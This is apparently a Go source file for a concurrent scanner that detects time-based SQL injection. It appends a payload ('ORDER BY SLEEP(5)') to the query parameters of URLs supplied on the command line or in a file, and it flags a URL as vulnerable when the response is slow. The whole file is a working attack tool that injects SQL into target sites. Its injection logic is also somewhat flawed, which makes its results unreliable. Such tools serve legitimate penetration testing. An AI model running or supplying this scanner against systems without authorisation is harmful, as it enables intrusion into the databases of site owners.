package main

import (
	"bufio"
	"flag"
	"fmt"
	"net/http"
	"net/url"
	"os"
	"strings"
	"sync"
	"time"
)

func main() {
	// Command-line flags
	urlFlag := flag.String("u", "", "Target URL")
	payloadFlag := flag.String("p", "+ORDER+BY+SLEEP(5)--+-", "SQL injection payload")
	timeFlag := flag.Float64("t", 5, "Response time threshold in seconds")
	fileFlag := flag.String("f", "", "File containing multiple URLs")

	flag.Parse()

	// Replace spaces with '+' in the payloadFlag
	*payloadFlag = strings.ReplaceAll(*payloadFlag, " ", "+")
	
	// Validate command-line arguments
	if err := validateFlags(*urlFlag, *fileFlag); err != nil {
		fmt.Printf("Error: %v\n", err)
		flag.PrintDefaults()
		return
	}


	// If a file is provided, read URLs from the file
	var urls []string
	if *fileFlag != "" {
		urlsFromFile, err := readURLsFromFile(*fileFlag)
		if err != nil {
			fmt.Printf("Error reading URLs from file: %v\n", err)
			return
		}
		urls = urlsFromFile
	} else {
		// If -f is not provided, use the single URL provided with -u
		urls = append(urls, *urlFlag)
	}

	// Use a WaitGroup to wait for all goroutines to finish
	var wg sync.WaitGroup

	// Test each URL for time-based SQL injection
	for _, url := range urls {
		// Increment the WaitGroup counter
		wg.Add(1)

		// Launch a goroutine to test the URL
		go testURL(url, *payloadFlag, *timeFlag, &wg)
	}

	// Wait for all goroutines to finish
	wg.Wait()
}

// testURL tests a single URL for time-based SQL injection
func testURL(urlString, payload string, threshold float64, wg *sync.WaitGroup) {
	// Decrement the WaitGroup counter when the goroutine completes
	defer wg.Done()

	// Parse the URL
	parsedURL, err := url.Parse(urlString)
	if err != nil {
		fmt.Printf("Error parsing URL %s: %v\n", urlString, err)
		return
	}

	// Get the query parameters
	queryParams := parsedURL.Query()

	// A map to keep track of processed parameters
	processedParams := make(map[string]bool)

	// Test each query parameter individually
	for param, values := range queryParams {
		// Skip processing if the parameter has already been processed
		if processedParams[param] {
			continue
		}

		// Increment the WaitGroup counter
		wg.Add(1)

		// Mark the parameter as processed
		processedParams[param] = true

		// Launch a goroutine to test the parameter
		go testParameter(urlString, param, values, payload, threshold, wg)
	}
}

// testParameter tests a single query parameter for time-based SQL injection
func testParameter(urlString, param string, values []string, payload string, threshold float64, wg *sync.WaitGroup) {
	// Decrement the WaitGroup counter when the goroutine completes
	defer wg.Done()

	// Iterate over each parameter value
	for _, value := range values {
		// Create the URL with the payload injected into the specific parameter
		urlWithPayload := urlString + "&" + param + "=" + value + payload

		// Test the URL for time-based SQL injection
		start := time.Now()
		resp, err := http.Get(urlWithPayload)
		elapsed := time.Since(start)

		if err != nil {
			return
		}

		defer resp.Body.Close()

		// Get the response time in seconds
		responseTime := elapsed.Seconds()

		// Get and print the result based on the response time
		result := getResult(urlString, responseTime, threshold, param)
		fmt.Println(result)
	}
}


// validateFlags checks if either -u or -f is provided
func validateFlags(urlFlag, fileFlag string) error {
	if urlFlag == "" && fileFlag == "" {
		return fmt.Errorf("Either -u or -f flag is required")
	}
	return nil
}

// readURLsFromFile reads URLs from a file and returns a slice of URLs
func readURLsFromFile(filename string) ([]string, error) {
	var urls []string
	file, err := os.Open(filename)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		urls = append(urls, scanner.Text())
	}

	if err := scanner.Err(); err != nil {
		return nil, err
	}

	return urls, nil
}

// getResult determines if the URL is vulnerable based on the response time without including the response body
func getResult(urlString string, responseTime, threshold float64, param string) string {
	if responseTime >= threshold {
		return fmt.Sprintf("%s \x1b[33m[param: %s]\x1b[0m \x1b[1;32m=> Vulnerable\x1b[0m", urlString, param)
	}
	return fmt.Sprintf("%s \x1b[33m[param: %s]\x1b[0m \x1b[1;31m=> Not vulnerable\x1b[0m", urlString, param)
}
